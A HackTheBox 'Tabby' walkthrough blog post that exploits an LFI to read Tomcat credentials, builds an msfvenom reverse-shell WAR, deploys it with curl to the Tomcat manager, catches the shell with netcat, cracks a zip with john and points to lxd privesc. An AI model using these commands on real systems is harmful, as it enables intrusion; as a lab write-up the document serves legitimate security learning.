@@ -1,0 +1,375 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>Acruxlare | HackTheBox - Tabby</title>
+  <meta name="description" content="Walkthrough of Tabby box on Hackthebox.">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="HackTheBox - Tabby">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://fumenoid.github.io/posts/hackthebox-tabby">
+  <meta property="og:description" content="Walkthrough of Tabby box on Hackthebox.">
+  <meta property="og:site_name" content="Acruxlare">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="https://fumenoid.github.io/posts/hackthebox-tabby">
+  <meta name="twitter:title" content="HackTheBox - Tabby">
+  <meta name="twitter:description" content="Walkthrough of Tabby box on Hackthebox.">
+
+  
+    
+      <meta property="og:image" content="https://fumenoid.github.io/assets/documentation/tabbythumb-1ebe534f343cbdba5676c31293f9bdd5efdac672a7cdff6ec977ff4c8cba27a4.png">
+      <meta property="og:image:height" content="286">
+      <meta property="og:image:width" content="507">
+      <meta name="twitter:image" content="https://fumenoid.github.io/assets/documentation/tabbythumb-1ebe534f343cbdba5676c31293f9bdd5efdac672a7cdff6ec977ff4c8cba27a4.png">
+      <meta name="twitter:card" content="summary_large_image">
+    
+  
+
+  <link href="https://fumenoid.github.io/feed.xml" type="application/rss+xml" rel="alternate" title="Acruxlare Last 10 blog posts" />
+
+  
+
+  
+
+    
+      <link rel="icon" type="image/x-icon" href="/assets/favicon-dark-f46876861f8611b1be1e40dbc82954f6ce18e041809dce43ba85794a93ef72e2.ico">
+      <link rel="apple-touch-icon" href="/assets/apple-touch-icon-dark-d161409442b7e523089f24d08d0a55951549ece7504207c376d53b020713494d.png">
+      <link rel="stylesheet" type="text/css" href="/assets/dark-831218bc9e41aef39ee6a0bae4501195bccafcc13101ae2b9cd20493a6ec04c0.css">
+    
+
+  
+
+</head>
+
+<body>
+  <main>
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav scrollappear">
+  <a href="/" class="header-logo" title="Acruxlare">Acruxlare</a>
+  <ul class="header-links">
+    
+      <li>
+        <a href="/about" title="About me">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
+  <use href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about" xlink:href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="https://twitter.com/fumenoid" rel="noreferrer noopener" target="_blank" title="Twitter">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-twitter">
+  <use href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter" xlink:href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+      <li>
+        <a href="https://github.com/fumenoid" rel="noreferrer noopener" target="_blank" title="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
+  <use href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github" xlink:href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="mailto:fumenoid@gmail.com" title="Email">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
+  <use href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email" xlink:href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+  </ul>
+</nav>
+
+
+  <ul class="header-tags scrollappear">
+    
+    
+      
+        <li><a href="/tag/forensics">Forensics</a></li>
+    
+      
+        <li><a href="/tag/hackthebox">Hackthebox</a></li>
+    
+      
+        <li><a href="/tag/programming">Programming</a></li>
+    
+      
+        <li><a href="/tag/sorcery">Sorcery</a></li>
+    
+      
+        <li><a href="/tag/tryhackme">Tryhackme</a></li>
+    
+  </ul>
+
+
+        <article class="article scrollappear">
+          <header class="article-header">
+            <h1>HackTheBox - Tabby</h1>
+            <p>Walkthrough of Tabby box on Hackthebox.</p>
+            <div class="article-list-footer">
+  <span class="article-list-date">
+    November 7, 2020
+  </span>
+  <span class="article-list-divider">-</span>
+  <span class="article-list-minutes">
+    
+    
+      5 minute read
+    
+  </span>
+  <span class="article-list-divider">-</span>
+  <div class="article-list-tags">
+    
+      
+      <a href="/tag/hackthebox" title="See all posts with tag 'hackthebox'">hackthebox</a>
+    
+  </div>
+</div>
+          </header>
+
+          <div class="article-content">
+            <p><a href="/assets/documentation/tabby-4ebc13cbdf300ab839120ed8282dd3d32210dd6028c23f3f75ccffaa8544fb50.webp">
+  <img src="/assets/documentation/tabby-4ebc13cbdf300ab839120ed8282dd3d32210dd6028c23f3f75ccffaa8544fb50.webp" alt="HTB Tabby" class="zooming" data-rjs="/assets/documentation/tabby-4ebc13cbdf300ab839120ed8282dd3d32210dd6028c23f3f75ccffaa8544fb50.webp" data-zooming-width="1200" data-zooming-height="675" />
+</a></p>
+
+<h2 id="htb---tabby">HTB - Tabby</h2>
+
+<p>IP - 10.10.10.194</p>
+
+<h3 id="overview">Overview</h3>
+
+<p>This box was a easy level linux box on HTB created by <a href="https://www.hackthebox.eu/home/users/profile/1190">egre55</a> , it started with finding an <code class="highlighter-rouge">LFI</code> on the website running on port <code class="highlighter-rouge">80</code> and using it to find the <code class="highlighter-rouge">credentials</code> of the <code class="highlighter-rouge">tomcat</code> manager portal, but manager portal is not accessible to us so we cannot upload our <code class="highlighter-rouge">war exploit</code> using it instead we use <code class="highlighter-rouge">curl</code> to upload and deploy our war exploit and get a <code class="highlighter-rouge">reverse shell</code> through it. User is simple, basic enumeration will lead to you a <code class="highlighter-rouge">zip file</code> and then we crack the password of that zip file, which is also the password of user <code class="highlighter-rouge">ash</code>. Root was pretty slick based on <code class="highlighter-rouge">lxd</code>, we found user ash is in group lxd and then simply follow an <code class="highlighter-rouge">lxd privesc blog</code> to get root on the box.</p>
+
+<h3 id="enumeration">Enumeration</h3>
+
+<p>As always let’s start off with nmap script nmap -sC for default scripts <del>Alright, if it isn’t obvious yet I am a IPPSEC fanboi.</del> Aight, firing up nmap to scan all open ports on the box.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oA</span> nmap/results 10.10.10.194</code></pre></figure>
+
+<p>And here is our nmap result</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Tabby]
+└──╼ <span class="nv">$cat</span> nmap/result 
+<span class="c"># Nmap 7.80 scan initiated Sun Jun 21 14:32:32 2020 as: nmap -sC -sV -oA nmap/result 10.10.10.194</span>
+Nmap scan report <span class="k">for </span>10.10.10.194
+Host is up <span class="o">(</span>0.25s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 997 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+80/tcp   open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Mega Hosting
+8080/tcp open  http    Apache Tomcat
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Apache Tomcat
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Sun Jun 21 14:33:24 2020 -- 1 IP address (1 host up) scanned in 52.75 seconds</span></code></pre></figure>
+
+<p>So we have Apache web server on port 80, lets explore that first.</p>
+
+<h4 id="enumerating-the-apache-web-server">Enumerating the Apache Web Server</h4>
+
+<p>The website looks like some hosting platform.</p>
+
+<p><a href="/assets/documentation/tabbyapache-266fe9503ad9d8660ad801d30e16a96f4509fa24ef855f343e35b32c4869f164.webp">
+  <img src="/assets/documentation/tabbyapache-266fe9503ad9d8660ad801d30e16a96f4509fa24ef855f343e35b32c4869f164.webp" alt="HTB Tabby" class="zooming" data-rjs="/assets/documentation/tabbyapache-266fe9503ad9d8660ad801d30e16a96f4509fa24ef855f343e35b32c4869f164.webp" data-zooming-width="1366" data-zooming-height="710" />
+</a></p>
+
+<p>After a bit enumeration, we find <code class="highlighter-rouge">news.php</code> page which has an <code class="highlighter-rouge">LFI</code>.</p>
+
+<p><a href="/assets/documentation/tabbyapachenews-7fb16b0671929726f4fa364feeac8274b55aeeb0620cc61d28a7e22035beb41d.webp">
+  <img src="/assets/documentation/tabbyapachenews-7fb16b0671929726f4fa364feeac8274b55aeeb0620cc61d28a7e22035beb41d.webp" alt="HTB Tabby" class="zooming" data-rjs="/assets/documentation/tabbyapachenews-7fb16b0671929726f4fa364feeac8274b55aeeb0620cc61d28a7e22035beb41d.webp" data-zooming-width="1366" data-zooming-height="716" />
+</a></p>
+
+<p><a href="/assets/documentation/tabbyapachelfi-2faeecd6c091c781ff29f4f24ad90d70b48c41bcbbc6ef18f135a0a84dd453b5.webp">
+  <img src="/assets/documentation/tabbyapachelfi-2faeecd6c091c781ff29f4f24ad90d70b48c41bcbbc6ef18f135a0a84dd453b5.webp" alt="HTB Tabby" class="zooming" data-rjs="/assets/documentation/tabbyapachelfi-2faeecd6c091c781ff29f4f24ad90d70b48c41bcbbc6ef18f135a0a84dd453b5.webp" data-zooming-width="1366" data-zooming-height="686" />
+</a></p>
+
+<p>I tried to find <code class="highlighter-rouge">apache logs</code> or any other logs that might help me get <code class="highlighter-rouge">RCE</code> but got nothing usefull at all. So I started enumeration the other <code class="highlighter-rouge">tomcat server</code>.</p>
+
+<h4 id="enumerating-the-tomcat-web-server">Enumerating the Tomcat Web Server</h4>
+
+<p>Ahh.. Default Tomcat page D: 
+<a href="/assets/documentation/tabbytomcat-e5355bbdaf1570e74f907bd06f07226f8aef6239e77b8ba337d2d4f00f2c29e5.webp">
+  <img src="/assets/documentation/tabbytomcat-e5355bbdaf1570e74f907bd06f07226f8aef6239e77b8ba337d2d4f00f2c29e5.webp" alt="HTB Tabby" class="zooming" data-rjs="/assets/documentation/tabbytomcat-e5355bbdaf1570e74f907bd06f07226f8aef6239e77b8ba337d2d4f00f2c29e5.webp" data-zooming-width="1366" data-zooming-height="714" />
+</a></p>
+
+<p>I tried using <code class="highlighter-rouge">gobuster</code> to find hidden directories but got nothing at all D:</p>
+
+<h4 id="foothold">Foothold</h4>
+
+<p>After reading forums I got the nudge that we can look for the file that stores the default creds of tomcat user, using the <code class="highlighter-rouge">LFI</code> vuln we have on the main website running on port 80.</p>
+
+<p><a href="/assets/documentation/tabbycreds-6a85979b47caa3c8e492ef0470b3b4520f44b1338db4ba5b9ebe427d96e2eca8.webp">
+  <img src="/assets/documentation/tabbycreds-6a85979b47caa3c8e492ef0470b3b4520f44b1338db4ba5b9ebe427d96e2eca8.webp" alt="HTB Tabby" class="zooming" data-rjs="/assets/documentation/tabbycreds-6a85979b47caa3c8e492ef0470b3b4520f44b1338db4ba5b9ebe427d96e2eca8.webp" data-zooming-width="1366" data-zooming-height="717" />
+</a></p>
+
+<p>And we got tomcat credentials <code class="highlighter-rouge">tomcat:$3cureP4s5w0rd123!</code></p>
+
+<p><a href="/assets/documentation/tabbymanager-b84dfb9f7b78b049410e00e89d277c2e9d30fb400c7ef9b8afa9663a26715093.webp">
+  <img src="/assets/documentation/tabbymanager-b84dfb9f7b78b049410e00e89d277c2e9d30fb400c7ef9b8afa9663a26715093.webp" alt="HTB Tabby" class="zooming" data-rjs="/assets/documentation/tabbymanager-b84dfb9f7b78b049410e00e89d277c2e9d30fb400c7ef9b8afa9663a26715093.webp" data-zooming-width="1366" data-zooming-height="716" />
+</a></p>
+
+<p>Ah even though our creds are right we don’t have access to the manager console, I looked around for ways to upload our war exploit and found that we can use <code class="highlighter-rouge">curl</code> to upload and deploy it. <em>Thanks to <code class="highlighter-rouge">pop_eax</code> for nudge on the command as those bad characters were messing it up for me.</em> <br />
+Alright first thing first, let’s create a reverse shell exploit using <code class="highlighter-rouge">msfvenom</code>.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Tabby]
+└──╼ <span class="nv">$msfvenom</span> <span class="nt">-p</span> java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.182 <span class="nv">LPORT</span><span class="o">=</span>9889 <span class="nt">-f</span> war <span class="o">&gt;</span> shell.war
+Payload size: 1097 bytes
+Final size of war file: 1097 bytes</code></pre></figure>
+
+<p>Cool, now let’s upload our war exploit using using the <code class="highlighter-rouge">curl</code> command.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Tabby]
+└──╼ <span class="nv">$curl</span> <span class="nt">-u</span> tomcat:<span class="s1">'$3cureP4s5w0rd123!'</span> <span class="s2">"http://10.10.10.194:8080/manager/text/deploy?path=/pwned&amp;update=true"</span> <span class="nt">--upload-file</span> shell.war
+OK - Deployed application at context path <span class="o">[</span>/pwned]</code></pre></figure>
+
+<p>Yeet, it got successfully deployed, starting the netcat listner using <code class="highlighter-rouge">rlwrap nc -lvnp 9889</code> and navigating to <code class="highlighter-rouge">http://10.10.10.194:8080/pwned</code> to get our reverse shell.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Tabby]
+└──╼ <span class="nv">$rlwrap</span> nc <span class="nt">-lvnp</span> 9889
+listening on <span class="o">[</span>any] 9889 ...
+connect to <span class="o">[</span>10.10.14.182] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.194] 35390
+<span class="nb">whoami
+</span>tomcat
+which python
+which python3
+/usr/bin/python3
+python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+tomcat@tabby:/var/lib/tomcat9<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
+<span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
+tomcat@tabby:/var/lib/tomcat9<span class="nv">$ </span></code></pre></figure>
+
+<h3 id="getting-user">Getting User</h3>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Tabby]
+└──╼ <span class="nv">$rlwrap</span> nc <span class="nt">-lvnp</span> 9889
+listening on <span class="o">[</span>any] 9889 ...
+connect to <span class="o">[</span>10.10.14.182] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.194] 35390
+...
+tomcat@tabby:/var/www/html/files<span class="nv">$ </span><span class="nb">ls
+ls
+</span>16162020_backup.zip  archive  revoked_certs  statement
+tomcat@tabby:/var/www/html/files<span class="err">$</span></code></pre></figure>
+
+<p>After some basic enumeration we got a zip file which was password protected, so I pulled it over to my machine and cracked it using john, <code class="highlighter-rouge">zip2john *.zip &gt; hash and john hash -wordlist=/usr/share/wordlist/rockyou.txt</code>.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Tabby]
+└──╼ <span class="nv">$john</span> hashed <span class="nt">--show</span>
+16162020_backup.zip:admin@it::16162020_backup.zip:var/www/html/news.php, var/www/html/logo.png, var/www/html/index.php:16162020_backup.zip
+
+1 password <span class="nb">hash </span>cracked, 0 left</code></pre></figure>
+
+<p>Got the password for the zip file <code class="highlighter-rouge">admin@it</code> and it was also the password of user <code class="highlighter-rouge">ash</code>.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Tabby]
+└──╼ <span class="nv">$rlwrap</span> nc <span class="nt">-lvnp</span> 9889
+listening on <span class="o">[</span>any] 9889 ...
+connect to <span class="o">[</span>10.10.14.182] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.194] 35390
+...
+tomcat@tabby:/<span class="nv">$ </span>su
+su
+password : admit@it
+ash@tabby:/<span class="nv">$whoami</span>
+<span class="nb">whoami
+</span>ash</code></pre></figure>
+
+<h3 id="rooting-the-box">Rooting the Box</h3>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">sh@tabby:/<span class="nv">$ </span><span class="nb">id
+id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>ash<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>ash<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>ash<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,116<span class="o">(</span>lxd<span class="o">)</span></code></pre></figure>
+
+<p><code class="highlighter-rouge">lxd</code> seems like something interesting, I googled about it and found a <a href="https://www.hackingarticles.in/lxd-privilege-escalation/">blog post</a> that covers how you can do a privesc if user is in <code class="highlighter-rouge">lxd group</code>, I simply followed the blog to get root. <em>I am not covering the root part as it’s simple and a blog covering it is already present.</em></p>
+
+<p><a href="/assets/documentation/tabbyroot-32ad11ada330f8fa125d99b7afe081401dea8204f23faecda9f7a61bafb1a24c.webp">
+  <img src="/assets/documentation/tabbyroot-32ad11ada330f8fa125d99b7afe081401dea8204f23faecda9f7a61bafb1a24c.webp" alt="HTB Tabby" class="zooming" data-rjs="/assets/documentation/tabbyroot-32ad11ada330f8fa125d99b7afe081401dea8204f23faecda9f7a61bafb1a24c.webp" data-zooming-width="418" data-zooming-height="96" />
+</a></p>
+
+<h6 id="hope-you-learned-something-new-if-you-face-any-issues--have-any-query-feel-free-to-contact-me-on-social-media">Hope you learned something new, if you face any issues / have any query, feel free to contact me on social media.</h6>
+
+          </div>
+          <div class="article-share">
+            
+            
+            <a href="https://twitter.com/intent/tweet?url=https://fumenoid.github.io/posts/hackthebox-tabby&via=fumenoid&text=HackTheBox - Tabby : Walkthrough of Tabby box on Hackthebox." title="Share on Twitter" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"/></svg>
+            </a>
+            <a href="https://www.facebook.com/sharer/sharer.php?u=https://fumenoid.github.io/posts/hackthebox-tabby" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"/></svg>
+            </a>
+          </div>
+
+          
+        </article>
+        <footer class="footer scrollappear">
+  <p>
+    Happy Hacking :D
+  </p>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-172959519-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-172959519-1');
+  </script>
+
+
+<script src="/assets/vendor-130c9c254effc51f3283620bc635851da7b99c20901216948f11ba72ee13317f.js" type="text/javascript"></script>
+
+
+  <script src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js" type="text/javascript"></script>
+
+
+
+  <script src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js" type="text/javascript"></script>
+
+
+<script src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js" type="text/javascript"></script>
+
+
+</body>
+</html>
